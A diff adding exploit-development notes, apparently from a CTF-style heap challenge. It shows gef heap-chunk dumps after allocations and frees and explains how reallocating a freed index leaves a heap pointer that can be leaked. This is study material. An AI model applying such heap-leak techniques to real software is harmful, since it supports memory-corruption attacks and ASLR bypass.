@@ -1,0 +1,66 @@
+ALL ALLOCATIONS COMPLETE:
+
+gef➤  heap chunks                                                                                      
+Chunk(addr=0x9e22008, size=0x28, flags=PREV_INUSE)                                                     
+    [0x09e22008     30 20 e2 09 70 20 e2 09 b0 20 e2 09 00 00 00 00    0 ..p ... ......]               
+Chunk(addr=0x9e22030, size=0x18, flags=PREV_INUSE)                                                     
+    [0x09e22030     a8 9a 04 08 08 00 00 00 00 00 00 00 48 20 e2 09    ............H ..]               
+Chunk(addr=0x9e22048, size=0x28, flags=PREV_INUSE)                                                     
+    [0x09e22048     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]               
+Chunk(addr=0x9e22070, size=0x18, flags=PREV_INUSE)                                                     
+    [0x09e22070     a8 9a 04 08 08 00 00 00 00 00 00 00 88 20 e2 09    ............. ..]               
+Chunk(addr=0x9e22088, size=0x28, flags=PREV_INUSE)                                                     
+    [0x09e22088     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]               
+Chunk(addr=0x9e220b0, size=0x18, flags=PREV_INUSE)                                                     
+    [0x09e220b0     a8 9a 04 08 08 00 00 00 00 00 00 00 c8 20 e2 09    ............. ..]               
+Chunk(addr=0x9e220c8, size=0x28, flags=PREV_INUSE)                                                     
+    [0x09e220c8     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]               
+Chunk(addr=0x9e220f0, size=0x20f18, flags=PREV_INUSE)  ←  top chunk                                    
+
+<chunk 2> 0x9e22030+0xc  -> <chunk 3> 0x9e22048 (index[0], size 8)
+<chunk 2> 0x09e22070+0xc -> <chunk 3> 0x9e22088 (index[1], size 8)
+<chunk 2> 0x9e220b0+0xc  -> <chunk 3> 0x9e220c8 (index[2], size 8) 
+
+free(0):
+
+gef➤  heap chunks                                                                                      
+Chunk(addr=0x9e22008, size=0x28, flags=PREV_INUSE)                                                     
+    [0x09e22008     30 20 e2 09 70 20 e2 09 b0 20 e2 09 00 00 00 00    0 ..p ... ......]               
+Chunk(addr=0x9e22030, size=0x18, flags=PREV_INUSE)                                                     
+    [0x09e22030     00 00 00 00 08 00 00 00 00 00 00 00 48 20 e2 09    ............H ..]               
+Chunk(addr=0x9e22048, size=0x28, flags=PREV_INUSE)                                                     
+    [0x09e22048     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]               
+
+0x9e22030 at offset 0x00 now points to 0x00000000 instead of 0x08049aa8
+
+free(1):
+
+gef➤  heap chunks                                                                                      
+Chunk(addr=0x9e22070, size=0x18, flags=PREV_INUSE)                                                     
+    [0x09e22070     28 20 e2 09 08 00 00 00 00 00 00 00 88 20 e2 09    ( ........... ..]               
+Chunk(addr=0x9e22088, size=0x28, flags=PREV_INUSE)                                                     
+    [0x09e22088     40 20 e2 09 00 00 00 00 00 00 00 00 00 00 00 00    @ ..............]               
+Chunk(addr=0x9e220b0, size=0x18, flags=PREV_INUSE)                                                     
+    [0x09e220b0     a8 9a 04 08 08 00 00 00 00 00 00 00 c8 20 e2 09    ............. ..]               
+Chunk(addr=0x9e220c8, size=0x28, flags=PREV_INUSE)                                                     
+    [0x09e220c8     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]               
+Chunk(addr=0x9e220f0, size=0x20f18, flags=PREV_INUSE)  ←  top chunk                                    
+
+0x9e22070 at offset 0x00 now points to 0x09e22028 instead of 0x08049aa8
+And <chunk 3> at offset 0x00 now points to 0x09e22040
+
+LAST ALLOCATION:
+
+Let's review we allocated 3 objects, then free'd index 0 and 1. This causes <chunk 3> pointed to by
+<chunk 2> at index 1 to have been populated by a heap pointer 0x09e22040 at offset 0x00. However
+<chunk 2> has been tampered / changed as well so now we need to restore it. When we trigger another
+allocation at index 1, 0x9e22070 at offset 0x00 will be restored to 0x08049aa8. 
+
+Leaving 0x9e22070+0xc pointing to 0x09e22088 which still contains a heap address at index 0,
+which we can then leak.
+
+
+
+
+
+
